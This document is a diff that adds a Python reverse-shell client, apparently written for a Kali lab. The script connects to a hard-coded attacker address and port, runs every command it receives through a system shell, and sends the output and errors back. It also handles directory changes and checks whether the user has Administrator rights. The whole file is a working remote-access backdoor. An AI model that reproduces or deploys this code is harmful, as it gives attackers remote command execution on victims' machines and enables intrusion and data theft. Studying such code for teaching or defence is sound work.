@@ -1,0 +1,57 @@
+#for building tcp connection
+import socket
+import os
+
+
+#to start the shell in the system
+import subprocess
+
+def connect ():
+    Mysocket = socket.socket()
+
+    #here we define the attacker IP and the listening port
+    Mysocket.connect(("192.168.86.43", 8080))
+
+    while True:
+        #keep receiving commands from the Kali machine, read 5000 b of the tcp socket
+        command = Mysocket.recv(5000)
+
+        #if we get terminate command, close the socket and break the loop
+        if "terminate" in command.decode():
+            Mysocket.close()
+            break
+        elif 'cd' in command.decode():
+            try:
+                code, directory = command.decode().split(" ",1)
+                os.chdir(directory)
+                informToServer = "[+] Current working director is " + os.getcwd()
+                Mysocket.send(informToServer.encode())
+            except Exception as e:
+                informToServer = "[+] Some error. " + str(e)
+                Mysocket.send(informToServer.encode())
+        elif 'checkuserlevel' in command.decode():
+            try:
+                CMD = subprocess.Popen('whoami /groups', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output, error = CMD.communicate()
+                if b'Administrators' in output:
+                    Mysocket.send(b"[+] User is an Administrator.\n")
+                else:
+                    Mysocket.send(b"[+] User is NOT an Administrator.\n")
+            except Exception as e:
+                Mysocket.send(f"[+] Error: {str(e)}\n".encode())
+
+        #otherwise, send command to a shell process
+        else:
+            CMD = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
+
+            #send back the result
+            Mysocket.send(CMD.stdout.read())
+
+            #send back the error
+            Mysocket.send(CMD.stderr.read())
+
+def main():
+    connect()
+
+if __name__ =="__main__":
+    main()
